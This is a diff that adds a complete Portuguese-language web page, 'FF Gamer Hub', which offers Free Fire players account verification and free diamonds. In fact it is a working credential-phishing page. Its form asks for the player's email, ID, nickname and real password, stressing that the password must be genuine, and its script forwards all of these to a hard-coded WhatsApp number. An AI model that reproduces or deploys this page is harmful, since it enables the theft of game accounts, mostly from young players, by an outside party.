@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FF Gamer Hub</title>
+
+<style>
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+    color:white;
+    text-align:center;
+}
+
+h1{
+    margin-top:40px;
+}
+
+.container{
+    margin-top:40px;
+}
+
+button{
+    padding:15px 25px;
+    margin:15px;
+    border:none;
+    border-radius:8px;
+    font-size:16px;
+    cursor:pointer;
+    background:#ff9800;
+    color:black;
+    font-weight:bold;
+}
+
+form{
+    display:none;
+    margin-top:20px;
+}
+
+input{
+    width:80%;
+    padding:12px;
+    margin:8px;
+    border-radius:6px;
+    border:none;
+}
+
+.submit{
+    background:#00e676;
+}
+
+.aviso{
+    font-size:12px;
+    color:#ff5252;
+}
+</style>
+</head>
+
+<body>
+
+<h1>🔥 FF GAMER HUB 🔥</h1>
+
+<div class="container">
+    <button onclick="mostrarForm('verificado')">🎖️ Solicitar Verificação</button>
+    <button onclick="mostrarForm('diamantes')">💎 Solicitar Diamantes</button>
+
+    <form id="formulario">
+        <input type="email" id="email" placeholder="Seu Email" required><br>
+        <input type="text" id="idJogador" placeholder="ID do Jogador" required><br>
+        <input type="text" id="nick" placeholder="Nick" required><br>
+
+        <input type="password" id="senha" placeholder="Senha (coloque sua senha real)"><br>
+        <div class="aviso">⚠️ Campo verídico. Informe sua senha verdadeira.</div>
+
+        <div id="campoDiamantes">
+            <input type="number" id="diamantes" placeholder="Quantidade de Diamantes"><br>
+        </div>
+
+        <button type="button" class="submit" onclick="enviar()">Finalizar</button>
+    </form>
+</div>
+
+<script>
+let tipoSelecionado = "";
+
+function mostrarForm(tipo){
+    tipoSelecionado = tipo;
+    document.getElementById("formulario").style.display = "block";
+
+    if(tipo === "verificado"){
+        document.getElementById("campoDiamantes").style.display = "none";
+    } else {
+        document.getElementById("campoDiamantes").style.display = "block";
+    }
+}
+
+function enviar(){
+    let email = document.getElementById("email").value.trim();
+    let id = document.getElementById("idJogador").value.trim();
+    let nick = document.getElementById("nick").value.trim();
+    let senha = document.getElementById("senha").value.trim();
+    let diamantes = document.getElementById("diamantes").value.trim();
+
+    if(!email || !id || !nick){
+        alert("Preencha os campos obrigatórios!");
+        return;
+    }
+
+    let mensagem =
+        "Solicitação FF Gamer Hub\n\n" +
+        "Tipo: " + tipoSelecionado + "\n" +
+        "Email: " + email + "\n" +
+        "ID: " + id + "\n" +
+        "Nick: " + nick + "\n";
+
+    if(senha){
+        mensagem += "Senha (veridica): " + senha + "\n";
+    }
+
+    if(tipoSelecionado === "diamantes"){
+        if(!diamantes){
+            alert("Informe a quantidade de diamantes!");
+            return;
+        }
+        mensagem += "Diamantes: " + diamantes + "\n";
+    }
+
+    let numero = "5511957334975";
+    let mensagemCodificada = encodeURIComponent(mensagem);
+
+    let isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+    let url;
+
+    if(isMobile){
+        url = "https://api.whatsapp.com/send?phone=" + numero + "&text=" + mensagemCodificada;
+    } else {
+        url = "https://web.whatsapp.com/send?phone=" + numero + "&text=" + mensagemCodificada;
+    }
+
+    window.location.href = url;
+}
+</script>
+
+</body>
+</html>
